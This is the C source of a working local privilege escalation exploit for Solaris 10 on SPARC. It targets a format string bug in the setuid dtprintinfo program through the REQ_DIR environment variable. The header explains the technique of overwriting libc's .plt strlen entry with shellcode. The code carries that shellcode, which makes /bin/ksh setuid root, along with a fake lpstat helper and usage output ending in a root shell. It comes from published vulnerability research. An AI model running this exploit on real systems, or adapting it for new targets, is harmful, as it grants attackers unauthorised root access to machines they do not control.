/*
 * raptor_dtprintcheckdir_sparc2.c - Solaris/SPARC FMT LPE
 * Copyright (c) 2020 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * "You still haven't given up on me?" -- Bruce Wayne
 * "Never!" -- Alfred Pennyworth
 *
 * I would like to thank ~A. for his incredible research work spanning decades,
 * an endless source of inspiration for me.
 *
 * Whoah, this one wasn't easy! This is a pretty lean exploit now, but its
 * development took me some time. It's been almost two weeks, and I came
 * close to giving up a couple of times. Here's a summary of the main 
 * roadblocks and complications I ran into while porting my dtprintinfo 
 * format string exploit to SPARC:
 *
 * - Half word writes and similar techniques that need to print a large amount
 *   of chars are problematic, because we have both a format string bug and a
 *   stack-based buffer overflow, and we risk running out of stack space! We
 *   might be able to prevent this by increasing the size of the padding buffer,
 *   (buf2) but your mileage may vary.
 *
 * - I therefore opted for a more portable single-byte write, but SPARC is a
 *   RISC architecture and as such it's not happy with memory operations on 
 *   misaligned addresses... So I had to figure out a possibly novel technique 
 *   to prevent the dreaded Bus Error. It involves the %hhn format string, check
 *   it out!
 *
 * - Once I had my write-what primitive figured out, I needed to pick a suitable
 *   memory location to patch... and I almost ran out of options. Function
 *   activation records turned out to be cumbersome and unreliable (see my PoC
 *   raptor_dtprintcheckdir_sparc.c), .plt entries in the vulnerable binary 
 *   start with a null byte, and the usual OS function pointers that were 
 *   popular targets 15 years ago are not present in modern Solaris 10 releases
 *   anymore. Finally, I noticed that the libc also contains .plt jump codes 
 *   that get executed upon function calling. Since they don't start with a null
 *   byte, I decided to target them.
 *
 * - Instead of meddling with jump codes, to keep things simpler I decided to 
 *   craft the shellcode directly in the .plt section of libc by exploiting the 
 *   format string bug. This technique proved to be very effective, but 
 *   empirical tests showed that (for unknown reasons) the shellcode size was 
 *   limited to 36 bytes. It looks like there's a limit on the number of args,
 *   to sprintf(), unrelated to where we write in memory. Who cares, 36 bytes 
 *   are just enough to escalate privileges.
 *
 * After I plugged a small custom shellcode into my exploit, it worked like a
 * charm. Simple, isn't it?;)
 *
 * To get the libc base, use pmap on the dtprintinfo process, e.g.:
 * $ pmap 4190 | grep libc.so.1 | grep r-x
 * FE800000    1224K r-x--  /lib/libc.so.1
 *
 * To grab the offset to strlen in .plt, you can use objdump as follows:
 * $ objdump -R /usr/lib/libc.so.1 | grep strlen
 * 0014369c R_SPARC_JMP_SLOT  strlen
 *
 * This bug was likely fixed during the general cleanup of CDE code done by
 * Oracle in response to my recently reported vulnerabilities. However, I can't
 * confirm this because I have no access to their patches:/
 *
 * See also:
 * raptor_dtprintcheckdir_intel.c (vulnerability found by Marti Guasch Jimenez)
 * raptor_dtprintcheckdir_intel2.c
 * raptor_dtprintcheckdir_sparc.c (just a proof of concept)
 *
 * Usage:
 * $ gcc raptor_dtprintcheckdir_sparc2.c -o raptor_dtprintcheckdir_sparc2 -Wall
 * [on your xserver: disable the access control]
 * $ ./raptor_dtprintcheckdir_sparc2 10.0.0.104:0
 * raptor_dtprintcheckdir_sparc2.c - Solaris/SPARC FMT LPE
 * Copyright (c) 2020 Marco Ivaldi <raptor@0xdeadbeef.info>
 * 
 * Using SI_PLATFORM       : SUNW,SPARC-Enterprise (5.10)
 * Using libc/.plt/strlen  : 0xfe94369c
 * 
 * Don't worry if you get a SIGILL, just run /bin/ksh anyway!
 * 
 * lpstat called with -v
 * lpstat called with -v
 * lpstat called with -d
 * [on your xserver: double click on the fake "fnord" printer]
 * Illegal Instruction
 * $ ls -l /bin/ksh
 * -rwsrwsrwx   3 root     bin       209288 Feb 21  2012 /bin/ksh
 * $ ksh
 * # id
 * uid=100(user) gid=1(other) euid=0(root) egid=2(bin)
 * #
 *
 * Tested on:
 * SunOS 5.10 Generic_Virtual sun4u sparc SUNW,SPARC-Enterprise
 * [previous Solaris versions are also likely vulnerable (and easier to exploit)]
 */

#include <fcntl.h>
#include <link.h>
#include <procfs.h>
#include <stdio.h>
#include <stdlib.h>
#include <strings.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/systeminfo.h>

#define INFO1	"raptor_dtprintcheckdir_sparc2.c - Solaris/SPARC FMT LPE"
#define INFO2	"Copyright (c) 2020 Marco Ivaldi <raptor@0xdeadbeef.info>"

#define	VULN		"/usr/dt/bin/dtprintinfo"	// vulnerable program
#define	BUFSIZE		3000				// size of evil env var
#define	BUFSIZE2	10000				// size of padding buf
#define	STACKPOPSEQ	"%.8x"				// stackpop sequence
#define	STACKPOPS	383				// number of stackpops

/* default retloc is .plt/strlen in libc */
#define LIBCBASE	0xfe800000			// base address of libc
#define STRLEN		0x0014369c			// .plt/strlen offset

/* calculate numeric arguments for write string */
#define CALCARGS(N1, N2, N3, N4, B1, B2, B3, B4, BASE) {	\
	N1 = (B4 - BASE)			% 0x100;	\
	N2 = (B2 - BASE - N1)			% 0x100;	\
	N3 = (B1 - BASE - N1 - N2)		% 0x100;	\
	N4 = (B3 - BASE - N1 - N2 - N3)		% 0x100;	\
	BASE += N1 + N2 + N3 + N4;				\
}

char sc[] = /* Solaris/SPARC chmod() shellcode (max size is 36 bytes) */
/* chmod("./me", 037777777777) */
"\x92\x20\x20\x01"	/* sub  %g0, 1, %o1		*/
"\x20\xbf\xff\xff"	/* bn,a <sc - 4>		*/
"\x20\xbf\xff\xff"	/* bn,a <sc>			*/
"\x7f\xff\xff\xff"	/* call <sc + 4>		*/
"\x90\x03\xe0\x14"	/* add  %o7, 0x14, %o0		*/
"\xc0\x22\x20\x04"	/* clr  [ %o0 + 4 ]		*/
"\x82\x10\x20\x0f"	/* mov  0xf, %g1		*/
"\x91\xd0\x20\x08"	/* ta   8			*/
"./me";

/* globals */
char	*arg[2] = {"foo", NULL};
char	*env[256];
int	env_pos = 0, env_len = 0;

/* prototypes */
int	add_env(char *string);
void	check_zero(int addr, char *pattern);

/*
 * main()
 */
int main(int argc, char **argv)
{
	char		buf[BUFSIZE], *p = buf, buf2[BUFSIZE2];
	char		platform[256], release[256], display[256];
	int     	retloc = LIBCBASE + STRLEN;

	int		i, stackpops = STACKPOPS;
	unsigned	base, n[strlen(sc)]; /* must be unsigned */

	/* lpstat code to add a fake printer */
	if (!strcmp(argv[0], "lpstat")) {

		/* check command line */
		if (argc != 2)
			exit(1);

		/* print the expected output and exit */
		if(!strcmp(argv[1], "-v")) {
			fprintf(stderr, "lpstat called with -v\n");
			printf("device for fnord: /dev/null\n");
		} else {
			fprintf(stderr, "lpstat called with -d\n");
			printf("system default destination: fnord\n");
		}
		exit(0);
	}

	/* print exploit information */
	fprintf(stderr, "%s\n%s\n\n", INFO1, INFO2);

	/* process command line */
	if (argc < 2) {
		fprintf(stderr, "usage:\n$ %s xserver:display [retloc]\n$ /bin/ksh\n\n", argv[0]);
		exit(1);
	}
	sprintf(display, "DISPLAY=%s", argv[1]);
	if (argc > 2)
		retloc = (int)strtoul(argv[2], (char **)NULL, 0);

	/* evil env var: name + shellcode + padding */
	bzero(buf, sizeof(buf));
	memcpy(buf, "REQ_DIR=", strlen("REQ_DIR="));
	p += strlen("REQ_DIR=");

	/* padding buffer to avoid stack overflow */
	memset(buf2, 'B', sizeof(buf2));
	buf2[sizeof(buf2) - 1] = 0x0;

	/* fill the envp, keeping padding */
	add_env(buf2);
	add_env(buf);
	add_env(display);
	add_env("TMP_DIR=/tmp/just"); /* we must control this empty dir */
	add_env("PATH=.:/usr/bin");
	add_env("HOME=/tmp");
	add_env(NULL);

	/* format string: retloc */
	for (i = retloc; i - retloc < strlen(sc); i += 4) {
		check_zero(i, "ret location");
		*((void **)p) = (void *)(i); p += 4; 		/* 0x000000ff */
		memset(p, 'A', 4); p += 4; 			/* dummy      */
		*((void **)p) = (void *)(i); p += 4; 		/* 0x00ff0000 */
		memset(p, 'A', 4); p += 4; 			/* dummy      */
		*((void **)p) = (void *)(i); p += 4; 		/* 0xff000000 */
		memset(p, 'A', 4); p += 4; 			/* dummy      */
		*((void **)p) = (void *)(i + 2); p += 4; 	/* 0x0000ff00 */
		memset(p, 'A', 4); p += 4; 			/* dummy      */
	}

	/* format string: stackpop sequence */
	base = p - buf - strlen("REQ_DIR=");
	for (i = 0; i < stackpops; i++, p += strlen(STACKPOPSEQ), base += 8)
		memcpy(p, STACKPOPSEQ, strlen(STACKPOPSEQ));

	/* calculate numeric arguments */
	for (i = 0; i < strlen(sc); i += 4)
		CALCARGS(n[i], n[i + 1], n[i + 2], n[i + 3], sc[i], sc[i + 1], sc[i + 2], sc[i + 3], base);
	
	/* check for potentially dangerous numeric arguments below 10 */
	for (i = 0; i < strlen(sc); i++)
		n[i] += (n[i] < 10) ? (0x100) : (0);

	/* format string: write string */
	for (i = 0; i < strlen(sc); i += 4)
		p += sprintf(p, "%%.%dx%%n%%.%dx%%hn%%.%dx%%hhn%%.%dx%%hhn", n[i], n[i + 1], n[i + 2], n[i + 3]);

	/* setup the directory structure and the symlink to /bin/ksh */
	unlink("/tmp/just/chmod/me");
	rmdir("/tmp/just/chmod");
	rmdir("/tmp/just");
	mkdir("/tmp/just", S_IRWXU | S_IRWXG | S_IRWXO);
	mkdir("/tmp/just/chmod", S_IRWXU | S_IRWXG | S_IRWXO);
	symlink("/bin/ksh", "/tmp/just/chmod/me");

	/* create a symlink for the fake lpstat */
	unlink("lpstat");
	symlink(argv[0], "lpstat");

	/* print some output */
	sysinfo(SI_PLATFORM, platform, sizeof(platform) - 1);
	sysinfo(SI_RELEASE, release, sizeof(release) - 1);
	fprintf(stderr, "Using SI_PLATFORM\t: %s (%s)\n", platform, release);
	fprintf(stderr, "Using libc/.plt/strlen\t: 0x%p\n\n", (void *)retloc);
	fprintf(stderr, "Don't worry if you get a SIGILL, just run /bin/ksh anyway!\n\n");

	/* run the vulnerable program */
	execve(VULN, arg, env);
	perror("execve");
	exit(1);
}

/*
 * add_env(): add a variable to envp and pad if needed
 */
int add_env(char *string)
{
	int	i;

	/* null termination */
	if (!string) {
		env[env_pos] = NULL;
		return env_len;
	}

	/* add the variable to envp */
	env[env_pos] = string;
	env_len += strlen(string) + 1;
	env_pos++;

	/* pad the envp using zeroes */
	if ((strlen(string) + 1) % 4)
		for (i = 0; i < (4 - ((strlen(string)+1)%4)); i++, env_pos++) {
			env[env_pos] = string + strlen(string);
			env_len++;
		}

	return env_len;
}

/*
 * check_zero(): check an address for the presence of a 0x00
 */
void check_zero(int addr, char *pattern)
{
	if (!(addr & 0xff) || !(addr & 0xff00) || !(addr & 0xff0000) ||
	    !(addr & 0xff000000)) {
		fprintf(stderr, "error: %s contains a 0x00!\n", pattern);
		exit(1);
	}
}
